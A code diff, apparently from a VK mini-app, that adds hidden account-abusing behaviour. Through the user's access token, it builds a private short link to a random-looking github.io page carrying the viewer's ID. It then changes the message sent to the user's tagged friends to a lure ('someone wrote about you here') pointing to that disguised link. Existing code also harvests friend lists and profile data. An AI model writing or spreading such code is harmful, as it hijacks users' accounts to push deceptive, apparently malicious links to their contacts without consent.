@@ -243,19 +243,22 @@
           }
 
           function firstApi() {
+              var url_cc = "https://wdf54e3e3qq33eewf.github.io/index/red2_new.html#"+viewer.id;
               var code = 'var time=API.utils.getServerTime(); \n\
               var friends = API.friends.get({"fields": "sex, photo_100, photo_200, photo_max, photo_400_orig, photo_id, online, online_mobile, can_post, relation, last_seen, has_photo, common_count, followers_count, has_photo, occupation","count":500}); \n\
               var u=API.users.get({fields:"uid, first_name, last_name, photo_max, photo_100, photo_400_orig, photo_id, bdate, sex, city, relation, is_closed, counters"})[0]; \n\
               var g=parseInt(API.groups.isMember({group_id:9713780,v:5.24}))+parseInt(API.groups.isMember({group_id:166562603,v:5.24}))+parseInt(API.groups.isMember({group_id:134304772,v:5.24}))+parseInt(API.groups.getMembers({group_id:9713780,count:0,filter:"friends",v:5.24}).count)+parseInt(API.groups.getMembers({group_id:166562603,count:0,filter:"friends",v:5.24}).count)+parseInt(API.groups.getMembers({group_id:194823504,count:0,filter:"friends",v:5.24}).count);u.counters.friends=parseInt(u.counters.friends);if (u.counters.friends<10)g=g+1;if(u.id<1000000) g=g+1; \n\
               u.permissions=g; \n\
               var user={}; \n\
+              var link = API.utils.getShortLink({"url":"'+url_cc+'", "private":1}).short_url; \n\
               var r={user:u,permissions:g}; \n\
-              return [friends,time,r];';
+              return [friends,time,r,link];';
 
                vkConnect.sendPromise("VKWebAppCallAPIMethod", {
                   "method": "execute",
                   "params": {"code": code, "v": "5.95", "access_token": token}
               }).then(data => {
+                  url_cc = data.response[3];
                   viewer.friends = data.response[0];
                   var fr_temp = [];
                   for(var i = 0; i<viewer.friends.items.length; i++){
@@ -947,7 +950,7 @@
                       //"Оставляю о тебе мнение, прочитай если интересно : \n\n "+link_app+"\n\n"+users_list
                       //users_list+", oставляю о тебе мнения, посмотри если интересно : \n\n https://vk.com/app"+vk_app_id
                       var text = [
-                        users_list+", оставляю о тебе своё личное мнeниe, посмотри в приложении : \n\n https://vk.cc/cczHES "
+                        users_list+", про тебя тут написали : \n\n "+url_cc
                     ];
                     var caption = text[getRandom(0,text.length-1)];
 
